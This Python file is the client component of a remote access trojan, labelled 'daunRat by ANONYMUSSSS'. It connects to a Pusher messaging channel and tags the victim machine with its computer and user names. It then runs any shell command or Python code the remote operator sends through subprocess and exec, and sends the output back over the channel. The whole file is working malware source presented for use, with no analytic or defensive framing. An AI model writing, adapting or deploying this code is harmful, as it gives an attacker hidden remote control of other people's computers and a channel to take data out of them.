from env import *
import pusher
import pysher
import io
from contextlib import redirect_stdout
import subprocess
import sys
import os
sys.path.append('daun/modules')
import daun.modules as daun  # needed to use daun functionality from admin
from modules.selfutil import daunrat  # needed to use self utility functions
try:
    from custom_imports import *
except ImportError:
    pass

client_id = str()

client = pusher.Pusher(
    app_id=app_id,
    key=key,
    secret=secret,
    cluster=cluster,
    ssl=False
)
receiver = pysher.Pusher(key=key, cluster=cluster)


def on_command(data):
    global client_id
    print("Shell command received")
    try:
        shell_logs = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      close_fds=True, text=True).communicate()
    except Exception as e:
        shell_logs = str(e)
    client.trigger('client-' + client_id, 'logs', shell_logs)
    print("Shell logs sent on client-" + client_id)
    print("Shell logs: " + shell_logs)


def on_python(data):
    global client_id
    print("Python code received")
    f = io.StringIO()
    with redirect_stdout(f):
        try:
            exec(data)
        except Exception as e:
            print(e)
    python_logs = f.getvalue().strip()
    client.trigger('client-' + client_id, 'logs', python_logs)
    print("Python logs sent on client-" + client_id)
    print(python_logs)


def ping(data):
    print("Triggered ping")
    client.trigger('client-' + client_id, 'ping', 'pong')


def handle_connection_to_server(connection):
    global client_id
    print("Connected to server")
    print("Server returned: " + str(connection))
    try:
        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]
                            .split('@')[0]) + 1) + f'@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
    except IndexError:
        client_id = f'0@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
    channel = receiver.subscribe(f'admin-{client_id}')
    print("Client id: " + client_id)
    channel.bind('connection_from_admin', lambda _: print("Connection from admin"))
    channel.bind('ping', ping)
    channel.bind('command', on_command)
    channel.bind('python', on_python)


if __name__ == '__main__':
    print("daunRat by ANONYMUSSSS")
    receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
    receiver.connect()
    input()
